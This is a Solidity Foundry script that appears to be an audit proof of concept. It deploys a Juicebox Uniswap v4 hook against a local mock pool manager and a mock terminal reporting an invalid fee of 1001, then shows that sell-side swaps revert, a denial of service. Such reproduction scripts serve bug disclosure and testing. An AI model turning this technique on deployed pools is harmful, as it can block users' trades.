// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Script, console2} from "forge-std/Script.sol";

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {V4PoolManagerDeployer} from "hookmate/artifacts/V4PoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams, ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolModifyLiquidityTest} from "@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol";
import {HookMiner} from "@uniswap/v4-periphery/src/utils/HookMiner.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

import {JBUniswapV4Hook} from "../../src/JBUniswapV4Hook.sol";
import {MockERC20} from "../../test/mock/MockERC20.sol";
import {JuiceboxSwapRouter} from "../../test/utils/JuiceboxSwapRouter.sol";
import {IJBTokens, IJBPrices, IJBDirectory} from "../../src/JBUniswapV4Hook.sol";
import {JBCashOutHookSpecification} from "@bananapus/core-v6/src/structs/JBCashOutHookSpecification.sol";
import {JBRuleset} from "@bananapus/core-v6/src/structs/JBRuleset.sol";

contract MockJBTokensCodexNemesisInvalidFee {
    mapping(address => uint256) public projectIdOf;

    function setProjectId(address token, uint256 projectId) external {
        projectIdOf[token] = projectId;
    }
}

contract MockJBDirectoryCodexNemesisInvalidFee {
    address public mockTerminal;

    function setMockTerminal(address terminal) external {
        mockTerminal = terminal;
    }

    function controllerOf(uint256) external pure returns (address) {
        return address(0);
    }

    function primaryTerminalOf(uint256, address) external view returns (address) {
        return mockTerminal;
    }
}

contract MockJBPricesCodexNemesisInvalidFee {
    function pricePerUnitOf(uint256, uint256, uint256, uint256) external pure returns (uint256) {
        return 1e18;
    }
}

contract InvalidFeeTerminalCodexNemesis {
    uint256 internal immutable _grossReclaim;

    constructor(uint256 grossReclaim) {
        _grossReclaim = grossReclaim;
    }

    function previewCashOutFrom(
        address,
        uint256,
        uint256,
        address,
        address payable,
        bytes calldata
    )
        external
        view
        returns (JBRuleset memory ruleset, uint256 reclaimAmount, uint256, JBCashOutHookSpecification[] memory specs)
    {
        return (ruleset, _grossReclaim, 0, specs);
    }

    function FEE() external pure returns (uint256) {
        return 1001;
    }
}

contract CodexNemesisInvalidFeeSellDoSExecutor {
    using PoolIdLibrary for PoolKey;

    uint160 internal constant SQRT_PRICE_1_1 = 79_228_162_514_264_337_593_543_950_336;

    function execute() external {
        IPoolManager manager = IPoolManager(address(V4PoolManagerDeployer.deploy(address(this))));
        PoolModifyLiquidityTest modifyLiquidityRouter = new PoolModifyLiquidityTest(manager);
        JuiceboxSwapRouter jbSwapRouter = new JuiceboxSwapRouter(manager);

        MockJBTokensCodexNemesisInvalidFee tokens = new MockJBTokensCodexNemesisInvalidFee();
        MockJBDirectoryCodexNemesisInvalidFee directory = new MockJBDirectoryCodexNemesisInvalidFee();
        MockJBPricesCodexNemesisInvalidFee prices = new MockJBPricesCodexNemesisInvalidFee();
        InvalidFeeTerminalCodexNemesis invalidFeeTerminal = new InvalidFeeTerminalCodexNemesis(1 ether);
        directory.setMockTerminal(address(invalidFeeTerminal));

        uint160 flags = uint160(
            Hooks.AFTER_INITIALIZE_FLAG | Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG
                | Hooks.BEFORE_SWAP_RETURNS_DELTA_FLAG | Hooks.AFTER_ADD_LIQUIDITY_FLAG
                | Hooks.AFTER_REMOVE_LIQUIDITY_FLAG
        );

        bytes memory constructorArgs = abi.encode(
            manager, IJBTokens(address(tokens)), IJBDirectory(address(directory)), IJBPrices(address(prices))
        );
        (, bytes32 salt) = HookMiner.find(address(this), flags, type(JBUniswapV4Hook).creationCode, constructorArgs);

        JBUniswapV4Hook hook = new JBUniswapV4Hook{salt: salt}(
            manager, IJBTokens(address(tokens)), IJBDirectory(address(directory)), IJBPrices(address(prices))
        );

        MockERC20 projectToken = new MockERC20("Project", "PRJ");
        MockERC20 paymentToken = new MockERC20("Payment", "PAY");
        if (address(projectToken) > address(paymentToken)) {
            (projectToken, paymentToken) = (paymentToken, projectToken);
        }

        tokens.setProjectId(address(projectToken), 123);

        PoolKey memory key = PoolKey({
            currency0: Currency.wrap(address(projectToken)),
            currency1: Currency.wrap(address(paymentToken)),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(address(hook))
        });

        manager.initialize(key, SQRT_PRICE_1_1);

        projectToken.mint(address(this), 20 ether);
        paymentToken.mint(address(this), 20 ether);
        projectToken.approve(address(modifyLiquidityRouter), type(uint256).max);
        paymentToken.approve(address(modifyLiquidityRouter), type(uint256).max);
        projectToken.approve(address(jbSwapRouter), type(uint256).max);

        modifyLiquidityRouter.modifyLiquidity(
            key,
            ModifyLiquidityParams({tickLower: -60, tickUpper: 60, liquidityDelta: 10 ether, salt: bytes32(0)}),
            bytes("")
        );

        uint256 v4Quote = hook.estimateUniswapOutput(key.toId(), key, 1 ether, true);
        require(v4Quote > 0, "setup failed: V4 quote must be live");

        console2.log("V4 quote before revert path", v4Quote);

        try jbSwapRouter.swap(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -1 ether, sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1}),
            0
        ) {
            revert("expected swap to revert");
        } catch {
            console2.log("swap reverted before fallback, demonstrating invalid-fee sell-side DoS");
        }
    }
}

contract CodexNemesisInvalidFeeSellDoSScript is Script {
    function run() external {
        CodexNemesisInvalidFeeSellDoSExecutor executor = new CodexNemesisInvalidFeeSellDoSExecutor();
        executor.execute();
    }
}
